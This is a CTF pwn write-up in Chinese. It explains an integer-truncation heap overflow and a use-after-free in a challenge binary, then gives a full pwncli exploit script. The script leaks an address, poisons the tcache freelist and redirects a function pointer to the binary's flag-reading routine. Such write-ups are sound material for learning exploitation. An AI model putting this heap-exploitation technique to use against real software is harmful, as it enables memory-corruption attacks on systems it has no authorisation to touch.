# 漏洞点

1. `Option 1/2` 存在整数错配。
`items * stride` 的 64 位结果被当作逻辑长度保存，但实际分配只使用低 32 位；当低 32 位为 `0` 时只分配 `0x20`。之后 `stream artifact chunk` 仍按逻辑长度写，形成堆溢出。

2. `Option 6/7` 存在 UAF。

# 攻击思路

1. 先申请并释放一个 session。
2. 再注册 undersized artifact，然后 `bootstrap`。
此时 `task0->desc` 复用刚释放的 session chunk。
3. 用 artifact 溢出覆盖 `scheduler.ctrl + 0x8`，把 `strict_policy` 清零。
4. 再申请两个同大小 session，释放后放进 `0x50` tcache。
5. 用 UAF 修改 tcache freelist，让第二次分配落到 `desc0`。
6. 利用 session 初始化会清零整个 chunk、再把 `alias` 写到偏移 `0x10` 的特点，把 `desc0->handler` 改成 `audit_sink`。
7. 最后 `dispatch(0)`，直接调用程序内置的读 flag 逻辑。

from pwncli import *

look = lambda e: (
    lambda f: print(
        f"\033[38;5;220m>>> {e} ->  {(lambda v: hex(v) if isinstance(v,int) else v)(eval(e,f.f_globals,f.f_locals))}\033[0m"
    )
)(__import__("inspect").currentframe().f_back)

elf = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False)


def start():
    if "r" in sys.argv:
        return remote(HOST, PORT)
    return process([LD, "--library-path", "/home/qwer/pwn", BIN])


def protect_ptr(chunk_addr, target):
    return (chunk_addr >> 12) ^ target


def pwn(io):
    sla = io.sendlineafter
    ru = io.recvuntil

    def menu(n):
        sla(b"gateway> ", str(n).encode())

    def alloc_session(slot, size, alias):
        menu(5)
        sla(b"session.slot(0-15)> ", str(slot).encode())
        sla(b"session.tensor_bytes> ", str(size).encode())
        sla(b"session.alias> ", alias)

    def complete_session(slot):
        menu(6)
        sla(b"session.slot> ", str(slot).encode())

    def patch_session(slot, idx, value):
        menu(7)
        sla(b"diag.session.slot> ", str(slot).encode())
        sla(b"diag.qword_index> ", str(idx).encode())
        sla(b"diag.qword_value(u64)> ", str(value).encode())

    def register_artifact():
        menu(1)
        sla(b"manifest.items(u32)> ", b"268435456")
        sla(b"manifest.stride(u32)> ", b"16")

    def stream_artifact(offset, data):
        menu(2)
        sla(b"stream.offset> ", str(offset).encode())
        sla(b"stream.payload.hex> ", data)

    def bootstrap():
        menu(3)

    def inspect():
        menu(4)
        return ru(b"gateway> ")

    def telemetry():
        menu(10)
        return ru(b"gateway> ")

    pie = (
        int(re.search(rb"diag\.audit_sink=(0x[0-9a-f]+)", telemetry()).group(1), 16)
        - 0x6750
    )
    audit_sink = pie + 0x6750
    log.success(f"audit_sink = {hex(audit_sink)}")

    alloc_session(0, 8, b"A")
    s0 = int(re.search(rb"handle=(0x[0-9a-f]+)", telemetry()).group(1), 16)
    complete_session(0)

    register_artifact()
    bootstrap()
    stream_artifact(0x38, b"00")

    desc0 = int(re.search(rb"\[task:0\] desc=(0x[0-9a-f]+)", inspect()).group(1), 16)
    log.success(f"desc0 = {hex(desc0)}")

    patch_session(0, 0, 0)

    alloc_session(1, 8, b"B")
    s1 = int(
        re.search(rb"\[session:1\] handle=(0x[0-9a-f]+)", telemetry()).group(1), 16
    )
    alloc_session(2, 8, b"C")
    s2 = int(
        re.search(rb"\[session:2\] handle=(0x[0-9a-f]+)", telemetry()).group(1), 16
    )

    complete_session(1)
    complete_session(2)
    patch_session(2, 0, protect_ptr(s2, desc0))

    alloc_session(3, 8, b"D")
    alloc_session(4, 8, b"ABCDEFGH" + p64(audit_sink)[:6])

    log.info(inspect().decode(errors="ignore"))
    menu(9)
    sla(b"queue.task_id> ", b"0")
    io.interactive()


if __name__ == "__main__":
    io = start()
    pwn(io)
